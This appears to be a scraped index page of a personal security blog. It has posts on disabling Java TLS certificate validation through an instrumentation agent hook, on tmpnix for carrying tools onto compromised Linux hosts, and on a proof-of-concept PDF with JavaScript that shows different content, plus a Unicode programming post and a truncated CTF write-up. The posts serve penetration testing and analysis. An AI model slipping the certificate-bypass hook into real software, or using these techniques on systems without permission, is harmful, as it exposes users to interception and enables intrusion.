@@ -1,0 +1,1163 @@
+<!-- url: https://www.shiftordie.de
+status: 200 -->
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>shift or die</title>
+  <meta name="author" content="Alexander Klink">
+
+  
+  <meta name="description" content="
+  
+  
+  
+    
+      
+  
+    
+      Turning off certificate validation with Java instrumentation
+    
+    
+      
+          
+        
+        
+    ...">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="https://shiftordie.de/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/static/css/asciinema-player.css" rel="stylesheet" type="text/css">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="/javascripts/ender.js"></script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <script src="/static/js/asciinema-player.js" type="text/javascript"></script>
+  <link href="/feed.xml" rel="alternate" title="shift or die" type="application/atom+xml">
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<!-- <link href="http://fonts.googleapis.com/css?family=Montserrat|Source+Code+Pro" rel="stylesheet" type="text/css"> -->
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">shift or die</a></h1>
+  
+    <h2>security. photography. foobar.</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/feed.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div class="blog-index">
+  
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2019/07/28/turning-off-certificate-validation-with-java-instrumentation/">Turning off certificate validation with Java instrumentation</a></h1>
+    
+    
+      <p class="meta">
+          <p class="post-meta">
+        
+        
+          <time datetime="2019-07-28T14:30:00+00:00" itemprop="datePublished">Jul 28, 2019</time>
+        
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>A colleague and I recently lamented the lack of <a href="https://frida.re/">Frida</a>-like
+tools for Java. When analyzing Java-based fat-client application, our workflow
+would most of the time consist of decompiling, analyzing and then re-compiling
+Â»interestingÂ« classes which we modified to change behaviour or output some
+internal state (such as a network packet before it gets encapsulated in an
+encryption layer). Luckily, said colleague discovered the <a href="https://www.baeldung.com/java-instrumentation">Â»Guide to Java InstrumentationÂ«</a> article by <a href="https://twitter.com/adrianprecub">Adrian Precub</a> though, which shows how to add dynamic instrumentation either at startup or runtime. This is done by making use of the <a href="https://docs.oracle.com/javase/7/docs/api/java/lang/instrument/Instrumentation.html">Java instrumentation API</a> and <a href="https://www.javassist.org/">Javassist</a>, which allow us to add Java code to existing methods.</p>
+
+<p>I implemented a <a href="https://git.alech.de/alech/java-instrumentation-tool">quick tool</a> based on the blog post which allows you to build a
+so-called Java Agent that can be loaded on application start-up and modifies
+methods of your choice. In this blog post, I will walk you through an example,
+showing how to turn off certificate validation in an example application.</p>
+
+<p>Letâs look at our example application which tries to retrieve content from
+<a href="https://self-signed.badssl.com">https://self-signed.badssl.com</a>:</p>
+
+<div class="language-java highlighter-rouge"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">java.io.BufferedReader</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.net.HttpURLConnection</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.net.URL</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.InputStreamReader</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Example</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">5000</span><span class="o">);</span>
+        <span class="n">URL</span> <span class="n">url</span> <span class="o">=</span> <span class="k">new</span> <span class="n">URL</span><span class="o">(</span><span class="s">"https://self-signed.badssl.com/"</span><span class="o">);</span>
+        <span class="n">HttpURLConnection</span> <span class="n">con</span> <span class="o">=</span> <span class="o">(</span><span class="n">HttpURLConnection</span><span class="o">)</span> <span class="n">url</span><span class="o">.</span><span class="na">openConnection</span><span class="o">();</span>
+
+        <span class="n">BufferedReader</span> <span class="n">in</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="n">InputStreamReader</span><span class="o">(</span><span class="n">con</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">()));</span>
+        <span class="n">String</span> <span class="n">inputLine</span><span class="o">;</span>
+        <span class="k">while</span> <span class="o">((</span><span class="n">inputLine</span> <span class="o">=</span> <span class="n">in</span><span class="o">.</span><span class="na">readLine</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">inputLine</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+</code></pre>
+</div>
+
+<p>When we compile and run it, it fails due to the fact that Java (rightfully)
+does not trust the self-signed certificate:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>$ javac Example.java
+$ java Example
+Exception in thread "main" javax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target
+	at sun.security.ssl.Alerts.getSSLException(Alerts.java:192)
+[...]
+</code></pre>
+</div>
+
+<p>Digging a bit through the JRE source code, we can see that the <a href="https://github.com/frohoff/jdk8u-jdk/blob/master/src/share/classes/sun/security/ssl/X509TrustManagerImpl.java#L122">checkServerTrusted</a> method in <code class="highlighter-rouge">sun.security.ssl.X509TrustManagerImpl</code> will be called and if it does not throw an exception, the server certificate is considered trusted. Letâs modify this method by using the Java Instrumentation Tool:</p>
+
+<div class="language-sh highlighter-rouge"><pre class="highlight"><code><span class="gp">$ </span>wget https://github.com/alech/java-instrumentation-tool/releases/download/0.1/java-instrumentation-tool-0.1.jar
+<span class="gp">$ </span><span class="nb">echo</span> <span class="s1">'sun.security.ssl.X509TrustManagerImpl,checkServerTrusted,java.security.cert.X509Certificate[];java.lang.String;java.net.Socket,insertBefore,trustmanager.java'</span> &gt; hooks.txt
+<span class="gp">$ </span>mkdir hooks
+<span class="gp">$ </span><span class="nb">echo</span> <span class="s1">'return;'</span> &gt; hooks/trustmanager.java
+<span class="gp">$ </span>java -jar java-instrumentation-tool-0.1.jar hooks.txt
+</code></pre>
+</div>
+
+<p>We can see that we need to give the tool a class, method, type signature, place where to modify the code (at the beginning of the method â <code class="highlighter-rouge">insertBefore</code> or before every return statement â <code class="highlighter-rouge">insertAfter</code>) and a filename which contains the source code we want to add. In this case, we simply add a <code class="highlighter-rouge">return</code> statement at the top of the method in order to leave it quickly before it has a chance of throwing an exception.</p>
+
+<p>The tool created an <code class="highlighter-rouge">agent.jar</code> file for us which we can load when running our
+example application by specifying the <code class="highlighter-rouge">-javaagent</code> parameter:</p>
+
+<div class="language-sh highlighter-rouge"><pre class="highlight"><code>java -javaagent:agent.jar Example
+<span class="o">[</span>Agent] transforming sun.security.ssl.X509TrustManagerImpl.checkServerTrusted
+<span class="o">[</span>Agent] ClassTransformer constructor, sun.security.ssl.X509TrustManagerImpl, null
+<span class="o">[</span>Agent] Transforming class sun.security.ssl.X509TrustManagerImpl, method checkServerTrusted, param types java.security.cert.X509Certificate[];java.lang.String;java.net.Socket
+<span class="o">[</span>Agent] adding code before checkServerTrusted
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+<span class="o">[</span>...]
+</code></pre>
+</div>
+
+<p>We can see some output from the agent, and then we can see that this time, the
+TLS handshake succeeded and we get the output from the webserver as if it were
+using a trusted certificate.</p>
+
+<p>Obviously, this is not all you can do with Java instrumentation, your
+imagination on what you want to change or find out is the limit âºï¸.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2019/03/26/pdml2sbud/">pdml2sbud - pretty network packets in your terminal</a></h1>
+    
+    
+      <p class="meta">
+          <p class="post-meta">
+        
+        
+          <time datetime="2019-03-26T16:00:00+00:00" itemprop="datePublished">Mar 26, 2019</time>
+        
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><a href="https://twitter.com/angealbertini">Ange Albertini</a> and <a href="https://twitter.com/HDevo">RafaÅ Hirsz</a> recently released SBuD at Troopers (see <a href="https://twitter.com/angealbertini/status/1108734697281073153">talk slides</a>). Despite the warning that it is still an experimental tool, I played around with it a bit and found it quite nice to highlight structure and content in binary data. While SBuD is aimed at files, I immediately thought of using it to highlight network packets as well. This is why I built a small tool called <code class="highlighter-rouge">pdml2sbud</code>, which converts a Wireshark PDML file into the format used by <code class="highlighter-rouge">dat.py</code> from SBuD. See it in action below and <a href="https://git.alech.de/alech/pdml2sbud">clone it</a>. I made a few patches to <code class="highlighter-rouge">dat.py</code> so that the same part (or subsets) are highlighted in the same color, so you might want to use <a href="https://github.com/alech/sbud/tree/alech">my clone</a>.</p>
+
+<asciinema-player src="/static/pdml2sbud.cast" poster="npt:0:42.0"></asciinema-player>
+
+<p>Caveat: thereâs a few bugs left here and there, very much still work in
+progress. But I believe it serves as a nice PoC of what is possible with
+<code class="highlighter-rouge">dat.py</code> and that making hexdumps/network packet dumps prettier is possible :-)</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2019/02/05/introducing-tmpnix-an-alternative-to-static-binaries-for-post-exploitation/">Introducing tmpnix - an alternative to static binaries for post exploitation</a></h1>
+    
+    
+      <p class="meta">
+          <p class="post-meta">
+        
+        
+          <time datetime="2019-02-05T12:13:00+00:00" itemprop="datePublished">Feb 5, 2019</time>
+        
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h2 id="background">Background</h2>
+
+<p>If you are a penetration tester or red teamer, you might have run into the
+situation that you have gotten access to a Linux machine or container (either
+compromising it or by having been given white-box test access to the system in
+order to test the defense-in-depth mechanisms). Now wouldnât it be useful for
+further exploration or post-exploitation if you had <code class="highlighter-rouge">tmux</code> on that machine? Or
+<code class="highlighter-rouge">socat</code>? Or <code class="highlighter-rouge">strace</code>? Or <code class="highlighter-rouge">gdb</code>? Or <code class="highlighter-rouge">frida</code>? Or <code class="highlighter-rouge">r2</code>? Or <code class="highlighter-rouge">$tool_of_your_choice</code>? What do you usually
+do? You go for static binaries, either compiling them yourself, which might
+turn out to be fiddly, or you trust a random person on the internet who was
+kind enough to compile it for you.</p>
+
+<p>Let me present an alternative: <a href="https://nixos.org/nix/">Nix</a>. In case you did
+not hear about it, it is a purely functional package manager (and also the
+corresponding functional language to define those packages). One of the very
+useful things about it is that it will built self-contained packages which
+include all the dependencies that are needed to run it. So you could just build
+your favourite tool using Nix (which has a lot of packages <a href="https://nixos.org/nixos/packages.html">readily
+available</a>)
+and copy it to the compromised machine, right? Well, unfortunately,
+Nix binaries and the corresponding shared libraries by default live under
+<code class="highlighter-rouge">/nix</code>, which will probably not exist and not be writable in the likely case  that you are not <code class="highlighter-rouge">root</code>.</p>
+
+<p>I read in the past that it is possible (but not encouraged, because you loose
+the possibility to make use of the binary cache Nix provides for you) to change
+that directory. So I set out to build a Nix that lives under <code class="highlighter-rouge">/tmp</code> (or
+optionally under <code class="highlighter-rouge">/var/tmp</code> or some other directory you have write access to)
+so one could just copy binaries to a location of ones choice 
+and then execute nearly anything. It turned out a bit more tricky than expected
+but I managed. \o/.</p>
+
+<p>So let me introduce a <a href="https://git.alech.de/alech/tmpnix">dockerized version of that work</a> (if you want to do
+the same manually, just look through the <code class="highlighter-rouge">Dockerfile</code> to see what I do) which
+enables you to compile arbitrary Nix packages and bundle them up into a tarball
+which contains everything that is needed to run that binary from <code class="highlighter-rouge">/tmp/nix</code>.</p>
+
+<h2 id="quick-start-usage">Quick start usage</h2>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>$ git clone https://git.alech.de/alech/tmpnix
+$ cd tmpnix
+$ docker build base -t tmpnix-base
+$ docker build bootstrapped -t tmpnix
+$ docker volume create tmpnix
+$ docker run tmpnix search '.*strace.*'
+$ docker run --mount source=tmpnix,destination=/tmp/nix tmpnix build nixpkgs.strace
+</code></pre>
+</div>
+
+<p>After finishing to build, the script will tell you how to copy the tar-ball containing the build result and all of its run-time dependencies from the container.  Once you copied the tarball from the container, use <code class="highlighter-rouge">tar xjf &lt;tarball&gt; -C /</code> to unpack with <code class="highlighter-rouge">/</code> as a destination.</p>
+
+<asciinema-player src="/static/tmpnix.cast" poster="npt:0:07.2"></asciinema-player>
+
+<h2 id="future-work">Future work</h2>
+
+<p>Since this might be also super-useful to help with building cross-compiled binaries for
+e.g. ARM/Android/etc. and Nix already supports this, the next step is 
+to add support for that. First manual attempts looks like this is feasible but some work in figuring out the correct runtime dependencies is still needed. Also, maybe a little web interface that lets you
+search for packages, build them and download the built tarballs might be added. Weâll see.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2019/01/27/the-jekyll-and-hyde-pdf/">The strange case of the Jekyll and Hyde PDF</a></h1>
+    
+    
+      <p class="meta">
+          <p class="post-meta">
+        
+        
+          <time datetime="2019-01-27T15:00:00+00:00" itemprop="datePublished">Jan 27, 2019</time>
+        
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>A while back, I was pentesting a website which would allow people to upload PDF
+files describing their project. Those PDFs would then be reviewed by an
+employee, approved and put online on the companyâs website. Since I already
+knew that PDF is more of an execution environment (with JavaScript, ActionScript and FormCalc, thereâs at least three Turing-complete languages inside Adobe Reader) than a document format, I was thinking this might not be the best idea ever.</p>
+
+<p>Unfortunately, I did not find the time back then to make a proof-of-concept of a PDF that
+would display different content depending on some external condition, such as
+where the PDF was located or what time it was. For some reason the idea that I
+did want to make a PoC came back to me recently though and I spent a few hours
+this weekend to make it happen.</p>
+
+<p><img src="/static/jhpdf.jpg" alt="Random output" /></p>
+
+<p>The above screenshot shows <a href="/static/jekyll_and_hyde.pdf">a PDF</a> which when opened in Adobe Reader randomly either shows Dr. Jekyll or Mr. Hyde. So how does this work? The file was generated using the <a href="https://git.alech.de/alech/jekyll-hyde-pdf">jhpdf.py</a> script I made. It uses the Adobe XML Forms Architecture to embed two images and mark one as hidden. When opening the file, JavaScript code is executed which either resets the hidden flag of the second image or does not (in the above case based on a simple <code class="highlighter-rouge">Math.random() &lt;= 0.5</code> condition.</p>
+
+<p>In case you want to build one yourself, you can think about possible
+conditions by looking at the <a href="https://www.adobe.com/content/dam/acom/en/devnet/acrobat/pdfs/AcrobatDC_js_api_reference.pdf">JavaScript for Acrobat API Reference</a>
+document. It offers lots of interesting properties such as the file path of the
+document, the current time, up to screen resolution and installed printers.</p>
+
+<p>Note that if the document is opened in a reader which does not support XFA, it
+will just show a blank document.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2018/08/17/how-to-transform-camels-purescript-haskell/">How to turn a Dromedary camel into a Bactrian camel</a></h1>
+    
+    
+      <p class="meta">
+          <p class="post-meta">
+        
+        
+          <time datetime="2018-08-17T20:40:00+00:00" itemprop="datePublished">Aug 17, 2018</time>
+        
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>I recently stumbled over <a href="https://twitter.com/jmaslak/status/1029722380518780929">a tweet</a> by
+<a href="https://twitter.com/jmaslak/">@jmaslak</a> which talks about how you can turn a
+Dromedary camel into a Bactrian camel using Perl6. The following code:</p>
+
+<pre><code class="language-perl6">my $c = 'ðª';
+$c++;
+say $c;
+</code></pre>
+
+<p>produces the following output: âð«â</p>
+
+<p>The reason for that is the Unicode characters ðª and ð« have the code points
+U+1F42A and U+1F42B respectively, so the <code class="highlighter-rouge">++</code> operator moves from one to the next (while
+looking at that code I also learned that <code class="highlighter-rouge">++</code> is not the same as <code class="highlighter-rouge">+= 1</code> â if you try this, rakudo complains that ðª is not a valid base-10 number).</p>
+
+<p>Since I am currently in the process of learning more about both
+<a href="https://www.haskell.org">Haskell</a> and
+<a href="http://www.purescript.org">PureScript</a>, I decided I wanted to try and replicate that code in both
+languages.</p>
+
+<p>In Haskell, I managed quite quickly as follows:</p>
+<div class="language-haskell highlighter-rouge"><pre class="highlight"><code><span class="kt">Prelude</span><span class="o">&gt;</span> <span class="kr">import</span> <span class="nn">Data.Char</span>
+<span class="kt">Prelude</span> <span class="kt">Data</span><span class="o">.</span><span class="kt">Char</span><span class="o">&gt;</span> <span class="n">putStrLn</span> <span class="p">[(</span><span class="n">chr</span> <span class="o">.</span> <span class="p">(</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">.</span> <span class="n">ord</span><span class="p">)</span> <span class="sc">'ðª'</span><span class="p">]</span>
+<span class="err">ð«</span>
+</code></pre>
+</div>
+
+<p>While writing this blog post, I realized that <code class="highlighter-rouge">Char</code> has a <code class="highlighter-rouge">Enum</code> type class instance as
+well, so the code can be made even easier:</p>
+<div class="language-haskell highlighter-rouge"><pre class="highlight"><code><span class="kt">Prelude</span><span class="o">&gt;</span> <span class="n">putStrLn</span> <span class="p">[</span><span class="n">succ</span> <span class="sc">'ðª'</span><span class="p">]</span>
+<span class="err">ð«</span>
+</code></pre>
+</div>
+
+<p>PureScript created a bit more of a headache for me. I first tried to work with
+<code class="highlighter-rouge">toCharCode</code> from Data.Char, but â¦</p>
+
+<div class="language-haskell highlighter-rouge"><pre class="highlight"><code><span class="kt">PSCi</span><span class="p">,</span> <span class="n">version</span> <span class="mf">0.12</span><span class="o">.</span><span class="mi">0</span>
+<span class="kt">Type</span> <span class="o">:?</span> <span class="n">for</span> <span class="n">help</span>
+
+<span class="kr">import</span> <span class="nn">Prelude</span>
+
+<span class="o">&gt;</span> <span class="kr">import</span> <span class="nn">Data.Char</span>
+<span class="o">&gt;</span> <span class="n">toCharCode</span> <span class="sc">'ðª'</span>
+<span class="p">(</span><span class="n">line</span> <span class="mi">1</span><span class="p">,</span> <span class="n">column</span> <span class="mi">15</span><span class="p">)</span><span class="o">:</span>
+<span class="n">unexpected</span> <span class="n">astral</span> <span class="n">code</span> <span class="n">point</span> <span class="kr">in</span> <span class="n">character</span> <span class="n">literal</span><span class="p">;</span> <span class="n">characters</span> <span class="n">must</span> <span class="n">be</span> <span class="n">valid</span> <span class="kt">UTF</span><span class="o">-</span><span class="mi">16</span> <span class="n">code</span> <span class="n">units</span>
+</code></pre>
+</div>
+
+<p>What? That kinda reminds me about an 11 year old <a href="https://shiftordie.de/blog/2007/03/01/unicode-in-vbscript-the-ascw-rant/">rant about VBScript</a>.
+Oh well, luckily if one knows where to dig (or <a href="https://twitter.com/alech/status/1030196616223969284">whines a bit on Twitter</a>), the
+<code class="highlighter-rouge">Data.String.CodePoints</code> module comes to the rescue. Equipped with this, I
+arrived at the following solution:</p>
+
+<div class="language-haskell highlighter-rouge"><pre class="highlight"><code><span class="kr">import</span> <span class="nn">Data.String.CodePoints</span> <span class="p">(</span><span class="nf">singleton</span><span class="p">,</span> <span class="nf">codePointAt</span><span class="p">)</span>
+<span class="kr">import</span> <span class="nn">Data.Enum</span> <span class="p">(</span><span class="nf">succ</span><span class="p">)</span>
+<span class="kr">import</span> <span class="nn">Data.Maybe</span> <span class="p">(</span><span class="nf">maybe</span><span class="p">)</span>
+<span class="n">maybe</span> <span class="s">""</span> <span class="n">singleton</span> <span class="p">(</span><span class="n">codePointAt</span> <span class="mi">0</span> <span class="s">"ðª"</span> <span class="o">&gt;&gt;=</span> <span class="n">succ</span><span class="p">)</span>
+</code></pre>
+</div>
+
+<p>Wow, that looks a bit more complicated than in Haskell. OTOH, it is also safer.
+Let me try and explain what is happening here:</p>
+
+<p>Since we still canât use a Dromedary camel in a character literal, we have to
+put it into a string literal (I am still somewhat confused as to why that
+works, but it does not in character literals though â¦). We can then call the
+<code class="highlighter-rouge">codePointAt</code> function which has the following type:</p>
+
+<div class="language-haskell highlighter-rouge"><pre class="highlight"><code><span class="o">&gt;</span> <span class="o">:</span><span class="n">t</span> <span class="n">codePointAt</span>
+<span class="kt">Int</span> <span class="o">-&gt;</span> <span class="kt">String</span> <span class="o">-&gt;</span> <span class="kt">Maybe</span> <span class="kt">CodePoint</span>
+</code></pre>
+</div>
+
+<p>So we pass it an Int (the position in the string, 0 in our case) and a String
+and we get back a <code class="highlighter-rouge">Maybe CodePoint</code>. Why <code class="highlighter-rouge">Maybe</code>? Because if we want to get for
+example the code point of the second character of âðªâ, it does not exist, so it
+will return <code class="highlighter-rouge">Nothing</code> to signal this.</p>
+
+<p>As a second step, we want to get the next code point from here. Luckily,
+<code class="highlighter-rouge">CodePoint</code> has an <code class="highlighter-rouge">Enum</code> type class instance (at least in newer versions of
+<code class="highlighter-rouge">Data.String.CodePoints</code>, the above code unfortunately does not work on
+<a href="http://try.purescript.org">try.purescript.org</a> as Phil Freeman himself
+<a href="https://twitter.com/paf31/status/1030221641182105600">pointed out</a>). This means we can use the
+<code class="highlighter-rouge">succ</code> function which has the following type:</p>
+
+<div class="language-haskell highlighter-rouge"><pre class="highlight"><code><span class="o">&gt;</span> <span class="o">:</span><span class="n">t</span> <span class="n">succ</span>
+<span class="n">forall</span> <span class="n">a</span><span class="o">.</span> <span class="kt">Enum</span> <span class="n">a</span> <span class="o">=&gt;</span> <span class="n">a</span> <span class="o">-&gt;</span> <span class="kt">Maybe</span> <span class="n">a</span>
+</code></pre>
+</div>
+
+<p>My first attempt was to say: âOK, then I will just <code class="highlighter-rouge">(f)map</code> <code class="highlighter-rouge">succ</code> over the <code class="highlighter-rouge">Maybe
+CodePoint</code> returned by <code class="highlighter-rouge">codePointAt 0</code>â. But then I end up with a double <code class="highlighter-rouge">Just</code> construct:</p>
+
+<div class="language-haskell highlighter-rouge"><pre class="highlight"><code><span class="o">&gt;</span> <span class="n">succ</span> <span class="o">&lt;$&gt;</span> <span class="n">codePointAt</span> <span class="mi">0</span> <span class="s">"ðª"</span>
+<span class="p">(</span><span class="kt">Just</span> <span class="p">(</span><span class="kt">Just</span> <span class="p">(</span><span class="kt">CodePoint</span> <span class="mh">0x1F42B</span><span class="p">)))</span>
+</code></pre>
+</div>
+
+<p>Then I realized that I recently read in <a href="http://haskellbook.com/">The Haskell Book (Haskell Programming From First Principles)</a> that this is exactly the use case
+for Monads and the bind operator (<code class="highlighter-rouge">&gt;&gt;=</code>). So the bind operator makes sure that
+we get rid of one of the layers of <code class="highlighter-rouge">Maybe</code>s and does what we want:</p>
+
+<div class="language-haskell highlighter-rouge"><pre class="highlight"><code><span class="o">&gt;</span> <span class="n">codePointAt</span> <span class="mi">0</span> <span class="s">"ðª"</span> <span class="o">&gt;&gt;=</span> <span class="n">succ</span>
+<span class="p">(</span><span class="kt">Just</span> <span class="p">(</span><span class="kt">CodePoint</span> <span class="mh">0x1F42B</span><span class="p">))</span>
+</code></pre>
+</div>
+
+<p>We have a <code class="highlighter-rouge">Maybe CodePoint</code> now which we want to turn into a <code class="highlighter-rouge">String</code>. For this, we combine the <code class="highlighter-rouge">maybe</code> function from <code class="highlighter-rouge">Data.Maybe</code> and <code class="highlighter-rouge">singleton</code> from <code class="highlighter-rouge">Data.String.CodePoints</code>. Here are their types:</p>
+
+<div class="language-haskell highlighter-rouge"><pre class="highlight"><code><span class="o">&gt;</span> <span class="o">:</span><span class="n">t</span> <span class="n">maybe</span>
+<span class="n">forall</span> <span class="n">a</span> <span class="n">b</span><span class="o">.</span> <span class="n">b</span> <span class="o">-&gt;</span> <span class="p">(</span><span class="n">a</span> <span class="o">-&gt;</span> <span class="n">b</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kt">Maybe</span> <span class="n">a</span> <span class="o">-&gt;</span> <span class="n">b</span>
+
+<span class="o">&gt;</span> <span class="o">:</span><span class="n">t</span> <span class="n">singleton</span>
+<span class="kt">CodePoint</span> <span class="o">-&gt;</span> <span class="kt">String</span>
+</code></pre>
+</div>
+
+<p>Letâs start with singleton: It takes a <code class="highlighter-rouge">CodePoint</code> and gives us a <code class="highlighter-rouge">String</code> of length 1 with the character represented by that code point. The <code class="highlighter-rouge">maybe</code> function takes a default value, a function that goes from <code class="highlighter-rouge">a</code> to <code class="highlighter-rouge">b</code>, a <code class="highlighter-rouge">Maybe a</code> value and gives us a <code class="highlighter-rouge">b</code> value (either the default one if the <code class="highlighter-rouge">Maybe a</code> is <code class="highlighter-rouge">Nothing</code>, or the result of the function application of the value inside the <code class="highlighter-rouge">Just</code> in the other case).</p>
+
+<p>If we want to combine this function with <code class="highlighter-rouge">maybe</code>, we can figure out what the types <code class="highlighter-rouge">a</code> and <code class="highlighter-rouge">b</code> are in our specific case. For this we can used typed holes, something I recently learned about at the very nice FP Unconference <a href="http://www.bus-conf.org/">BusConf 2018</a>:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>&gt; :t maybe ?b singleton ?ma
+[...]
+    Hole 'b' has the inferred type
+
+    String
+
+[...]
+    Hole 'ma' has the inferred type
+
+    Maybe CodePoint
+</code></pre>
+</div>
+
+<p>So <code class="highlighter-rouge">b</code> is <code class="highlighter-rouge">String</code> and <code class="highlighter-rouge">a</code> is <code class="highlighter-rouge">CodePoint</code>. Great, we just need to choose the empty string as the default value and run it, then we end up with our camel!</p>
+
+<div class="language-haskell highlighter-rouge"><pre class="highlight"><code><span class="o">&gt;</span> <span class="n">maybe</span> <span class="s">""</span> <span class="n">singleton</span> <span class="p">(</span><span class="n">codePointAt</span> <span class="mi">0</span> <span class="s">"ðª"</span> <span class="o">&gt;&gt;=</span> <span class="n">succ</span><span class="p">)</span>
+<span class="s">"ð«"</span>
+</code></pre>
+</div>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2017/09/10/mrmcdctf-writeup-friendly-machine/">mrmcd CTF writeup: Friendly Machine</a></h1>
+    
+    
+      <p class="meta">
+          <p class="post-meta">
+        
+        
+          <time datetime="2017-09-10T16:45:00+00:00" itemprop="datePublished">Sep 10, 2017</time>
+        
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>I recently participated in the <a href="https://ctf.mrmcd.net">MRMCD CTF</a>. My
+favourite challenge was called âFriendly Machineâ.</p>
+
+<p>It consisted of a Python script which reads code from a Base64-encoded
+JSON-encoded array. The array itself looks something like this:</p>
+
+<div class="language-js highlighter-rouge"><pre class="highlight"><code><span class="p">[</span>
+   <span class="p">{</span>
+      <span class="s2">"ZeiteesohpiefeeyuHah"</span> <span class="p">:</span> <span class="s2">"start"</span><span class="p">,</span>
+      <span class="s2">"Jeicheidahmeichetaik"</span> <span class="p">:</span> <span class="s2">"ZeiteesohpiefeeyuHah"</span>
+   <span class="p">},</span>
+   <span class="p">{</span>
+      <span class="s2">"sebeeluoCaedohlaehoh"</span> <span class="p">:</span> <span class="s2">"ZERO"</span><span class="p">,</span>
+      <span class="s2">"IeCilahWaishaibiemoo"</span> <span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+      <span class="s2">"Jeicheidahmeichetaik"</span> <span class="p">:</span> <span class="s2">"ayahshecieleeYeingis"</span>
+   <span class="p">},</span>
+   <span class="p">{</span>
+      <span class="s2">"IeCilahWaishaibiemoo"</span> <span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+      <span class="s2">"sebeeluoCaedohlaehoh"</span> <span class="p">:</span> <span class="s2">"RES"</span><span class="p">,</span>
+      <span class="s2">"Jeicheidahmeichetaik"</span> <span class="p">:</span> <span class="s2">"ayahshecieleeYeingis"</span>
+   <span class="p">},</span>
+   <span class="p">{</span>
+      <span class="s2">"ZeiteesohpiefeeyuHah"</span> <span class="p">:</span> <span class="s2">"lencheck_start"</span><span class="p">,</span>
+      <span class="s2">"Jeicheidahmeichetaik"</span> <span class="p">:</span> <span class="s2">"ZeiteesohpiefeeyuHah"</span>
+   <span class="p">},</span>
+<span class="p">[...]</span>
+</code></pre>
+</div>
+
+<p>Hmmm, that kinda looks like variable assignments, labels, etc.? And sure
+enough, the main friendly machine code has a dictionary for variables
+and based on the entry in the current position in the code (yes, there
+are jumps, so itâs not necessarily linear) assignments or operations happen.
+Our goal is to end up in a position where we return 0, since then the flag
+is correct.</p>
+
+<p>First I set out to see if I can add some debug output to the execution,
+but that turned out to be rather confusing than helpful. Static analysis it is, then.
+I wrote a script to output the code in a more readable form:</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">code</span><span class="p">)):</span>
